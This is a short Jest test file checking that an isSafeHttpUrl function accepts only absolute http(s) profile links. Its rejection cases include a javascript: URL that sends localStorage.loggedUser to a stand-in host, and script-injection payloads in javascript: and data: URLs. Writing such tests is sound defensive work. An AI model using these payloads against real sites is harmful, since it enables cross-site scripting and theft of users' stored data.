import isSafeHttpUrl from "./isSafeHttpUrl";

// REQ-063 / AC-108: a profile link is only rendered when it is an absolute
// http(s) URL; anything else must not pass this check.
describe("isSafeHttpUrl", () => {
  test.each([
    ["http://example.com", true],
    ["https://example.com", true],
    ["HTTPS://example.com", true],
    ["  https://example.com  ", true],
    ["javascript:fetch('//x/?'+localStorage.loggedUser)", false],
    ["JaVaScRiPt:alert(1)", false],
    ["data:text/html,<script>alert(1)</script>", false],
    ["/relative/path", false],
    ["", false],
  ])("isSafeHttpUrl(%j) -> %s", (value, expected) => {
    expect(isSafeHttpUrl(value)).toBe(expected);
  });
});
